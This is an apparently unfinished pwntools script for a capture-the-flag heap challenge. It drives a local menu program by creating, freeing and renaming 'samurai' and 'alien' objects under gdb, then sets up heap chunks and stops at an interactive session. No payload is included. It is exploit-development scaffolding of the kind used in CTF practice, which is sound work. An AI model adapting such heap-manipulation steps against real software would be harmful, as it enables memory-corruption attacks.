#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./program")
p = process("./program")
gdb.attach(p,"init-pwndbg")

def new_samurai(name):
    p.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '1')
    p.sendlineafter('What is my weapon\'s name?\n', name)

def exit_dojo():
    p.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '3')

def new_alien(size, name):
    p.sendlineafter('Brood mother, what tasks do we have today.\n', '1')
    p.sendlineafter('How long is my name?\n', str(size))
    p.sendafter('What is my name?\n', name)

def consume_alien(index):
    p.sendlineafter('Brood mother, what tasks do we have today.\n', '2')
    p.sendlineafter('Which alien is unsatisfactory, brood mother?\n', str(index))

def rename_alien(index):
    p.sendlineafter('Brood mother, what tasks do we have today.\n', '3')
    p.sendlineafter('Brood mother, which one of my babies would you like to rename?\n', str(index))
    p.recvuntil('Oh great what would you like to rename ')
    return p.recvuntil(' to?\n').replace(' to?\n', '')

new_samurai('a'*8)
new_samurai('b'*8)
exit_dojo()
new_alien(0x48,'c'*8)
new_alien(0x48,'d'*8)
consume_alien(0)
p.interactive()